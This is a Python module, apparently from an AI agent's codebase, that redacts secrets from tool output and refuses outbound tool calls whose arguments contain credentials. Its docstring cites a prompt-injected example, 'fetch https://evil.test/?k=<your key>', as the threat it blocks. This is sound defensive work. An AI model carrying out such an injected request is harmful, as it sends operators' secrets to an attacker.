"""Keeping credentials out of the transcript and off the wire (roadmap P2).

Three protections built on one list of "values that must not leak" - the secrets in the
server's environment (anything named like a token, key, password or secret), values a
sandbox injects into commands, and any extra values an operator lists:

* **redact** - replace those values in tool output before it reaches the model or the
  transcript, so `env`, `echo $API_KEY` or a leaky log line cannot expose them;
* **outbound check** - refuse a network or external tool call whose arguments contain
  one of them (a prompt-injected "fetch https://evil.test/?k=<your key>");
* **sandbox env** (see sandbox.py) - the same names are removed from the environment a
  command runs with.

Values shorter than 8 characters, and obvious non-secrets (true/false/numbers), are
ignored so ordinary words are not mangled.
"""

from __future__ import annotations

import os
import re
from urllib.parse import unquote
from typing import Iterable, Optional

MIN_LENGTH = 8
_NAME = re.compile(r"(?i)(token|secret|passw(or)?d|passwd|api[_-]?key|private[_-]?key|credential|auth(orization)?[_-]?key|"
                   r"access[_-]?key|session[_-]?key|signing[_-]?key)")
_BORING = re.compile(r"^(true|false|none|null|yes|no|on|off|\d+)$", re.I)
_extra: dict[str, str] = {}


def is_secret_name(name: str) -> bool:
    return bool(_NAME.search(name or ""))


def register(name: str, value: str) -> None:
    """A value that must never appear in output or leave in a request (an injected secret)."""
    if value and len(value) >= MIN_LENGTH:
        _extra[name] = value


def unregister(name: str) -> None:
    _extra.pop(name, None)


_vault_cache: dict = {"stamp": None, "items": {}}


def _vault_secrets() -> dict[str, str]:
    """Passwords and TOTP secrets in the credential vault (bot/vault.py), re-read only when the file changes.
    Never raises: redaction must not be able to fail the agent."""
    try:
        from bot import vault

        path = vault._dir() / "vault.enc"
        stamp = (path.stat().st_mtime_ns, str(path))
    except Exception:  # noqa: BLE001
        return {}
    if _vault_cache["stamp"] != stamp:
        try:
            items = {k: v for k, v in vault.secrets() if len(v) >= MIN_LENGTH}
        except Exception:  # noqa: BLE001
            items = {}
        _vault_cache.update(stamp=stamp, items=items)
    return _vault_cache["items"]


def known_secrets(environ: Optional[dict] = None) -> dict[str, str]:
    env = os.environ if environ is None else environ
    found = {k: v for k, v in env.items()
             if is_secret_name(k) and isinstance(v, str) and len(v) >= MIN_LENGTH and not _BORING.match(v.strip())}
    found.update(_extra)
    found.update(_vault_secrets())
    return found


def _candidates(environ: Optional[dict]) -> list[tuple[str, str]]:
    # longest first, so a value that contains another is replaced whole
    return sorted(known_secrets(environ).items(), key=lambda kv: -len(kv[1]))


def redact(text: str, environ: Optional[dict] = None) -> str:
    if not isinstance(text, str) or len(text) < MIN_LENGTH:
        return text
    for name, value in _candidates(environ):
        if value in text:
            text = text.replace(value, f"[secret:{name}]")
    return text


def find_secret(value, environ: Optional[dict] = None) -> Optional[str]:
    """The name of a known secret whose value appears anywhere in `value` (a string, or a
    nested structure of them), else None."""
    cands = _candidates(environ)
    if not cands:
        return None
    for text in _strings(value):
        for variant in {text, unquote(text)}:          # a secret can hide behind %-encoding in a URL
            for name, secret in cands:
                if secret in variant:
                    return name
    return None


def _strings(value, depth: int = 0) -> Iterable[str]:
    if depth > 6:
        return
    if isinstance(value, str):
        yield value
    elif isinstance(value, dict):
        for k, v in value.items():
            yield from _strings(k, depth + 1)
            yield from _strings(v, depth + 1)
    elif isinstance(value, (list, tuple)):
        for v in value:
            yield from _strings(v, depth + 1)
